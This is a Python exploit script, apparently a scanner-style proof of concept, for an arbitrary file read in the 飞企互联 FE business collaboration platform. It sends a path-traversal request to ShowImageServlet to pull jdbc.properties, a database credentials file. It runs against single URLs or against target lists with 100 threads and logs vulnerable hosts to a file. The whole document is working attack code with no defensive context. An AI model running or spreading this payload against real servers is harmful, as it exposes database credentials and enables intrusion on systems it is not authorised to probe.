# 飞企互联FE业务协作平台_ShowImageServlet_任意文件读取
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                                       author:MOYV                                                                                                                                    
    """
    print(test)

def poc(target):
    api_payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        res = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'mssql' in res.text:
            print(f"[+]{target}存在任意文件读取")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在任意文件读取\n")
        else:
            print(f"[-]{target}不存在任意文件读取")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parser = argparse.ArgumentParser(description='飞企互联FE业务协作平台ShowImageServlet任意文件读取漏洞脚本')
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()